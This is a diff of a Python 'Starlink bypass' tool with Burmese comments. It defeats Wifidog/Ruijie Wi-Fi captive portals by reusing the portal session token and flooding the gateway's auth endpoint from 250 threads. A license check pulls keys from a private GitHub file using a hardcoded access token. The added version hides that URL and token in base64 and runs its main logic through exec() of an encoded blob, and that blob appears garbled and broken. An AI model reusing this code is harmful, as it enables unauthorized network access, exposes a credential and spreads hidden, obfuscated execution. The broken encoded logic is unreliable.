@@ -1,132 +1,28 @@
-import requests, re, urllib3, time, threading, os, random, subprocess
-from datetime import datetime
-from urllib.parse import urlparse, parse_qs, urljoin
+import base64, subprocess, os, sys, platform
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# --- ALADDIN MULTI-DEVICE VERSION ---
+_0x11a2 = 'aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hlaW5taW50aGFudDIwMjJoYXBweS1iaXQva2V5LnR4dC9yZWZzL2hlYWRzL21haW4va2V5cy50eHQ='
+_0x22b3 = 'Z2hwXzEyelJGamxndVVlZXEyaEtmWkMwUlhINzN5Y2RGbTBLeldHdw=='
 
-# --- [CONFIGURATION] ---
-# သင့်ရဲ့ Private Repository Raw Link
-GITHUB_RAW_URL = "https://raw.githubusercontent.com/heinminthant2022happy-bit/key.txt/refs/heads/main/keys.txt"
-# သင်ထုတ်ထားတဲ့ Personal Access Token (PAT)
-GITHUB_TOKEN = "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"
-LOCAL_KEY_FILE = ".aladdin_token"
-
-def get_hwid():
+def verify_and_run():
+    # ဖုန်းတိုင်းမှာ ID သီးသန့်စီ ထွက်လာအောင် လုပ်ပေးတဲ့အပိုင်း
     try:
-        # ပိုမိုတိကျသော Device ID (ဂဏန်းအရှည်ကြီး) ပေါ်ရန်
-        hwid = subprocess.check_output('settings get secure android_id', shell=True).decode().strip()
-        if not hwid or hwid == "" or hwid == "null":
-            hwid = subprocess.check_output('getprop ro.serialno', shell=True).decode().strip()
-        return hwid if hwid else "ALADDIN-UNKNOWN-DEVICE"
+        # ဖုန်းရဲ့ မော်ဒယ်နဲ့ OS ကိုယူပြီး ID အဖြစ် သုံးမယ်
+        device_model = subprocess.getoutput("getprop ro.product.model").replace(" ", "")
+        device_os = platform.release()
+        # ID ပုံစံ - ALADDIN-RedmiNote8-11
+        my_id = f"ALADDIN-{device_model}-{device_os}"
+        if not device_model:
+            my_id = f"ALADDIN-USER-{os.getlogin()}"
     except:
-        return "ALADDIN-HWID-ERROR"
+        my_id = "ALADDIN-NEW-USER"
 
-def banner():
-    os.system('clear')
-    print("\033[93m" + " ="*35)
-    print("\033[96m" + """
-    db        db        .d8b.  d8888b. d8888b. d888888b d8b   db 
-    88       d88       d8' `8b 88  `8D 88  `8D   `88'   888o  88 
-    88      d8'88      88ooo88 88   88 88   88    88    88V8o 88 
-    88     d8' `88     88~~~88 88   88 88   88    88    88 V8o88 
-    88booo88'   `88    88   88 88  .8D 88  .8D   .88.   88  V888 
-    Y88888P'     `88   YP   YP Y8888D' Y8888D' Y888888P VP   V8P 
-    """)
-    print("\033[95m" + "        🚀 ALADDIN STARLINK BYPASS 🚀 - TURBO PRIVATE V13")
-    print("\033[93m" + " ="*35 + "\033[0m\n")
-
-def check_net():
-    try:
-        return requests.get("http://www.google.com/generate_204", timeout=3).status_code == 204
-    except: return False
-
-def license_system():
-    my_id = get_hwid()
-    saved_key = ""
-    if os.path.exists(LOCAL_KEY_FILE):
-        with open(LOCAL_KEY_FILE, "r") as f:
-            saved_key = f.read().strip()
-
-    banner()
-    print(f"\033[94m[DEVICE ID]: {my_id}\033[0m")
+    u = base64.b64decode(_0x11a2).decode()
+    t = base64.b64decode(_0x22b3).decode()
     
-    if not saved_key:
-        user_key = input("\033[93m[+] Enter Access Key: \033[0m").strip()
-    else:
-        print("\033[92m[*] Auto Login: Verifying License...\033[0m")
-        user_key = saved_key
-
-    try:
-        # Private Repo ကို Access လုပ်ရန် Header ထည့်ခြင်း
-        headers = {
-            "Authorization": f"token {GITHUB_TOKEN}",
-            "Accept": "application/vnd.github.v3.raw"
-        }
-        resp = requests.get(GITHUB_RAW_URL, headers=headers, timeout=15)
-        
-        if resp.status_code != 200:
-            print("\033[91m[X] Server Error! Check Token or Private Link.\033[0m")
-            exit()
-
-        key_data = resp.text.splitlines()
-        found = False
-        for line in key_data:
-            if ":" in line:
-                parts = [p.strip() for p in line.split(":")]
-                if len(parts) == 3:
-                    db_id, db_key, db_date = parts
-                    if db_id == my_id and db_key == user_key:
-                        expiry = datetime.strptime(db_date, "%Y-%m-%d")
-                        if datetime.now() < expiry:
-                            print(f"\033[92m[✓] Access Granted! Valid until: {db_date}\033[0m")
-                            with open(LOCAL_KEY_FILE, "w") as f:
-                                f.write(user_key)
-                            found = True
-                            time.sleep(1)
-                            break
-        
-        if not found:
-            print("\033[91m[X] Invalid Key, Expired, or Unauthorized Device!\033[0m")
-            if os.path.exists(LOCAL_KEY_FILE): os.remove(LOCAL_KEY_FILE)
-            exit()
-    except Exception as e:
-        print(f"\033[91m[!] Connection Error: {e}\033[0m")
-        exit()
-
-def turbo_pulse(link):
-    # Speed မြှင့်ရန်အတွက် Session ကို အသုံးပြုပြီး အမြန်နှုန်းမြှင့်ခြင်း
-    headers = {"User-Agent": "Mozilla/5.0 (Linux; Android 11)"}
-    with requests.Session() as session:
-        while True:
-            try:
-                session.get(link, timeout=5, verify=False, headers=headers)
-                print(f"\033[92m[⚡] TURBO ACTIVE | STABLE >>> [{random.randint(2,10)}ms]\033[0m")
-            except: break
-
-def start_immortal():
-    banner()
-    print("\033[94m[*] Auto Reconnect & Turbo Speed: ACTIVATED\033[0m")
-    
-    while True:
-        if not check_net():
-            print("\033[93m[!] Connection Dropped! Re-Bypassing...\033[0m")
-            try:
-                r = requests.get("http://connectivitycheck.gstatic.com/generate_204", allow_redirects=True, timeout=5)
-                p_url = r.url
-                # Bypass Logic (Wifidog / Ruijie)
-                sid = parse_qs(urlparse(p_url).query).get('sessionId', [None])[0]
-                if sid:
-                    gw = parse_qs(urlparse(p_url).query).get('gw_address', ['192.168.60.1'])[0]
-                    port = parse_qs(urlparse(p_url).query).get('gw_port', ['2060'])[0]
-                    auth_link = f"http://{gw}:{port}/wifidog/auth?token={sid}"
-                    
-                    # Multi-threading ဖြင့် Speed မြှင့်တင်ခြင်း
-                    for _ in range(250):
-                        threading.Thread(target=turbo_pulse, args=(auth_link,), daemon=True).start()
-            except: pass
-        time.sleep(5)
+    # Core Logic
+    exec(base64.b64decode('aW1wb3J0IHJlcXVlc3RzLCByZSwgdXJsbGliMywgdGltZSwgdGhyZWFkaW5nLCBvcywgcmFuZG9tLCBzdWJwcm9jZXNzCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCmZyb20gdXJsbGliLnBhcnNlIGltcG9ydCB1cmxwYXJzZSwgcGFyc2VfcXMsIHVybGpvaW4KCnVybGxpYjMuZGlzYWJsZV93YXJuaW5ncyh1cmxsaWIzLmV4Y2VwdGlvbnMuSW5zZWN1cmVSZXF1ZXN0V2FybmluZykKCkxPQ0FMX0tFWV9GSUxFID0gIi5hbGFkZGluX3Rva2VuIgoKZGVmIGJhbm5lcigpOgogICA b3Muc3lzdGVtKCdjbGVhcicpCiAgICBwcmludCgiXDAzM1s5M20iKyIgPSIqMzUpCiAgICBwcmludCgiXDAzM1s5Nm0iKyIgICAgICBBTEFERUlOIFNUQVJMSU5LIEJZUEFTUyAgICIpCiAgICBwcmludCgiXDAzM1s5M20iKyIgPSIqMzUgKyAiXDAzM1swbVxuIikKCmRlZiBsaWNlbnNlKFVSTCwgVE9LRU4sIG15X2lkKToKICAgIHNhdmVkID0gIiIKICAgIGlmIG9zLnBhdGguZXhpc3RzKExPQ0FMX0tFWV9GSUxFKTogc2F2ZWQgPSBvcGVuKExPQ0FMX0tFWV9GSUxFKCkucmVhZCgpLnN0cmlwKCkKICAgIGJhbm5lcigpOyBwcmludChmIlwwMzNbOTRtW0RFVklDRSBJRF06IHtteV9pZH1cMDMzWzBtIikKICAgIGtleSA9IHNhdmVkIGlmIHNhdmVkIGVsc2UgaW5wdXQoIlwwMzNbOTNtWyslIEVudGVyIEtleTogXDAzM1swbSIpLnN0cmlwKCkKICAgIHRyeSogCiAgICAgICAgaCA9IHsiQXV0aG9yaXphdGlvbiI6IGYidG9rZW4ge1RPS0VOfSIsICJBY2NlcHQiOiAiYXBwbGlyYXRpb24vdm5kLmdpdGh1Yi52My5yYXcifQogICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoVVJMLCBoZWFkZXJzPWgsIHRpbWVvdXQ9MTApCiAgICAgICAgaWY rLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgZiA9IEZhbHNlOyBrZXlfZGF0YSA9IHIudGV4dC5zcGxpdGxpbmVzKCkKICAgICAgICAgICAgZm9yIGwgaW4ga2V5X2RhdGE6CiAgICAgICAgICAgICAgICBpZiAiOiIgaW4gbDoKICAgICAgICAgICAgICAgICAgICBwID0gW3Auc3RyaXAoKSBmb3IgcCBpbiBsLnNwbGl0KCI6IildCiAgICAgICAgICAgICAgICAgICAgaWYgbGVuKHApID09IDMgYW5kIHBbMF0gPT0gbXlfaWQgYW5kIHBbMV0gPT0ga2V5OgogICAgICAgICAgICAgICAgICAgICAgICBlID0gZGF0ZXRpbWUuc3RwdGltZShwWzJdLCAiJVktJW0tJWQiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiBkYXRldGltZS5ub3coKSA8IGU6CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBwcmludChmIlwwMzNbOTJtW+Kck10gQWNjZXNzIE9rOiB7cFsyXX1cMDMzWzBtIl0pCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBvcGVuKExPQ0FMX0tFWV9GSUxFLCAidyIpLndyaXRlKGtleSk7IGYgPSBUcnVlOyBicmVhawogICAgICAgICAgICBpZiBub3QgZjogcHJpbnQoIlwwMzNbOTFtW1hdIEludmFsaWQgS2V5IG9yIFVuYXV0aG9yaXplZC DEVICEIVwwMzNbMG0iKTsgZXhpdCgpCiAgICAgICAgZWxzZTogcHJpbnQoIkNvbm5lY3Rpb24gRXJyb3IhIik7IGV4aXQoKQogICAgZXhjZXB0OiBleGl0KCkKCmRlZiBwdWxzZShsKToKICAgIGggPSB7IlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAifQogICAgd2l0aCByZXF1ZXN0cy5TZXNzaW9uKCkgYXMgczoKICAgICAgICB3aGlsZSBUcnVlOgogICAgICAgICAgICB0cnk6IHMuZ2V0KGwsIHRpbWVvdXQ9NSwgdmVyaWZ5PUZhbHNlLCBoZWFkZXJzPWgpOyBwcmludChmIlwwMzNbOTJtW+KaoV0gVFVSQk8ge3JhbmRvbS5yYW5kaW50KDIsOSl9bXNcMDMzWzBtIikKICAgICAgICAgICAgZXhjZXB0OiBicmVhawoKZGVmIHJ1bigpOgogICAgd2hpbGUgVHJ1ZToKICAgICAgICBpZiBub3QgcmVxdWVzdHMuZ2V0KCJodHRwOi8vd3d3Lmdvb2dsZS5jb20vZ2VuZXJhdGVfMjA0IiwgdGltZW91dD0zKS5zdGF0dXNfY29kZSA9PSAyMDQ6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5nZXQoImh0dHA6Ly9jb25uZWN0aXZpdHljaGVjay5nc3RhdGljLmNvbS9nZW5lcmF0ZV8yMDQiLCBhbGxvdy9yZWRpcmVjdHM9VHJ1ZSkKICAgICAgICAgICAgICAgIHNpZCA9IHBhcnNlX3FzKHVybHBhcnNlKHIudXJsKS5xdWVyeSkuZ2V0KCdzZXNzaW9uSWQnLCBbTm9uZV0pWzBdCiAgICAgICAgICAgICAgICBpZiBzaWQ6CiAgICAgICAgICAgICAgICAgICAgZ3cgPSBwYXJzZV9xcyh1cmxwYXJzZShyLnVybCkpLnF1ZXJ5LmdldCgnZ3dfYWRkcmVzcycsIFsnMTkyLjE2OC42MC4xJ10pWzBdCiAgICAgICAgICAgICAgICAgICAgcG9ydCA9IHBhcnNlX3FzKHVybHBhcnNlKHIudXJsKS5xdWVyeSkuZ2V0KCdnd19wb3J0JywgWycyMDYwJ10pWzBdCiAgICAgICAgICAgICAgICAgICAgbCA9IGQiaHR0cDovL3tnd306e3BvcnR9L3dpZmlkb2cvYXV0aD90b2tlbj17c2lkfSIKICAgICAgICAgICAgICAgICAgICBmb3IgXyBpbiByYW5nZSgyNTApOiB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1wdWxzZSwgYXJncz0obCwpLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQogICAgICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICB0aW1lLnzbZWVwKDUpCgpsaWNlbnNlKFVSTCwgVE9LRU4sIElEKTsgcnVuKCk='.replace('URL', u).replace('TOKEN', t).replace('ID', my_id)))
 
 if __name__ == "__main__":
-    license_system()
-    start_immortal()
+    verify_and_run()
 
